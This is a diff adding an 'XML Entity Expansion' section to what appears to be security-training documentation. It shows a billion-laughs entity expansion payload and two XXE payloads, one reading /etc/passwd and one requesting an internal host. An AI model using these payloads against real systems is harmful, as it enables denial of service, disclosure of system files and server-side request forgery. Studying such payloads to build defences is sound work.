@@ -188,3 +188,47 @@ private static String fetchRemoteObject(String location) throws Exception {
     return body;
 }
 ```
+
+### XML Entity Expansion
+
+#### billion laughs attack
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY bar "SecureFlag ">
+  <!ENTITY t1 "&bar;&bar;">
+  <!ENTITY t2 "&t1;&t1;&t1;&t1;">
+  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
+]>
+<foo>
+  Join &t3;
+</foo>
+```
+
+#### forgery
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "file:///etc/passwd">
+]>
+<foo>
+  &xxe;
+</foo>
+```
+
+or 
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM
+  "http://internal.vulnerableapp.com:8443">
+]>
+<foo>
+  &xxe;
+</foo>
+```
